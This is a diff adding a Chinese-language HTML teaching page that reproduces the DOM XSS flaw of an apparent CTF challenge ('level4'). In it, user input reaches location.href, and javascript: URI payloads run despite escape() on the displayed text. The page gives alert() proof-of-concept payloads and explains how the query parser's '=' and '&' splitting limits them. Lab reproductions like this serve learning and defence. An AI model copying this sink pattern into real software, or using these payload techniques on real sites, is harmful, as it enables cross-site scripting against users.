@@ -1,0 +1,104 @@
+<!doctype html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>level4 漏洞点复现：location.href = jumpUrl</title>
+<style>
+  body { font-family: -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif;
+         max-width: 900px; margin: 24px auto; padding: 0 16px; line-height: 1.7; }
+  code, input { font-family: Consolas, monospace; }
+  .box { border: 1px solid #ddd; border-radius: 8px; padding: 12px 16px; margin: 18px 0; }
+  .hint { color: #666; font-size: 13px; }
+  #ccc { min-height: 1.7em; color: #a33; }
+  #echo { background: #f6f6f6; padding: 6px 8px; border-radius: 4px; word-break: break-all; }
+  button { padding: 6px 12px; cursor: pointer; }
+</style>
+</head>
+<body>
+
+<h2>level4 的漏洞点，单独拆出来看</h2>
+<p class="hint">这个页面不联网，就是原题的逻辑。</p>
+
+<div class="box">
+  <h3>① 核心就一行：把字符串塞给 location.href</h3>
+  <p>把下面的内容改成 <code>javascript:alert(document.domain)</code>，然后点按钮：</p>
+  <input id="u" size="70" value="javascript:alert(document.domain)">
+  <button onclick="location.href = document.getElementById('u').value;">立刻执行</button>
+  <p class="hint">这一步没有任何倒计时，等价于原题第 37 行 <code>location.href = jumpUrl;</code>。</p>
+</div>
+
+<div class="box">
+  <h3>② 原版逻辑：10 秒倒计时之后才跳</h3>
+  <p>原题就是先倒数 10 秒，到 0 才执行上面那一行。这里省成 3 秒，方便你试：</p>
+  <input id="u2" size="70" value="javascript:alert(1)">
+  <button onclick="startCountdown(3)">开始倒计时</button>
+  <div id="ccc"></div>
+  <p class="hint">注意：倒数期间显示的那句话，是经过 <code>escape()</code> 的；
+     真正执行时用的是没经过 <code>escape()</code> 的原字符串。这就是它没被挡住的原因。</p>
+</div>
+
+<div class="box">
+  <h3>③ 亲眼看看 escape() 干了什么</h3>
+  <p>在下面输入框里打字，右边实时显示 <code>escape()</code> 之后的样子：</p>
+  <input id="u3" size="70" value="javascript:alert(1)" oninput="document.getElementById('echo').textContent = escape(this.value);">
+  <div id="echo">javascript%3Aalert%281%29</div>
+  <p class="hint">看到没：<code>:</code> 变 <code>%3A</code>、<code>(</code> 变 <code>%28</code>。
+     如果这串被塞给 <code>location.href</code>，浏览器只会当成「一个叫 javascript%3A... 的网址」，什么事都不会发生。
+     <br>反过来：<code>&lt;script&gt;</code> 被 escape 成 <code>%3Cscript%3E</code>，塞进 innerHTML 也只是一段文字 —— 所以标签派 payload 在这关必死。</p>
+</div>
+
+<div class="box">
+  <h3>④ 试试失败的写法，理解边界</h3>
+  <ul>
+    <li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> —— 没反应（escape 之后是文字；就算不 escape，innerHTML 也不执行 script）</li>
+    <li><code>alert(1)</code> —— 没反应（没有 <code>javascript:</code> 前缀，浏览器当成相对路径，导航到 /alert(1)）</li>
+    <li><code>javascript:alert(1=1)</code> —— 没反应！因为 <code>getQueryVariable</code> 用 <code>=</code> 切分参数，值只取到第一个 <code>=</code> 前面（见 ⑤）</li>
+  </ul>
+</div>
+
+<div class="box">
+  <h3>⑤ 原题的参数解析函数（它有个坑）</h3>
+<pre><code>function getQueryVariable(variable) {
+    var query = window.location.search.substring(1);   // 去掉开头的 ?
+    var vars = query.split("&");                       // 按 & 切成 "k=v"
+    for (var i = 0; i &lt; vars.length; i++) {
+        var pair = vars[i].split("=");                 // 按 = 切成 [k, v]
+        if (pair[0] == variable) { return pair[1]; }   // 只返回第二个元素
+    }
+    return false;
+}</code></pre>
+  <p class="hint">所以 payload 里不能出现 <code>=</code>（会被切掉）和 <code>&amp;</code>（会被当成下一个参数）。
+     想赋值就绕开，比如 <code>javascript:alert(document.domain)</code> 而不是 <code>javascript:x=1;alert(x)</code>。</p>
+</div>
+
+<script>
+/* ---------- 原题的参数解析，一字不改 ---------- */
+function getQueryVariable(variable) {
+    var query = window.location.search.substring(1);
+    var vars = query.split("&");
+    for (var i = 0; i < vars.length; i++) {
+        var pair = vars[i].split("=");
+        if (pair[0] == variable) { return pair[1]; }
+    }
+    return false;
+}
+
+/* ---------- ② 原题的跳转逻辑，只把秒数改成参数 ---------- */
+function startCountdown(seconds) {
+    var time = seconds;
+    function jump(time) {
+        if (time == 0) {
+            location.href = document.getElementById('u2').value;   // ← 漏洞点，原样赋值
+        } else {
+            time = time - 1;
+            document.getElementById('ccc').innerHTML =
+                `页面${time}秒后将会重定向到${escape(document.getElementById('u2').value)}`;
+            setTimeout(jump, 1000, time);                           // 每秒递归一次
+        }
+    }
+    setTimeout(jump, 1000, time);
+}
+</script>
+
+</body>
+</html>
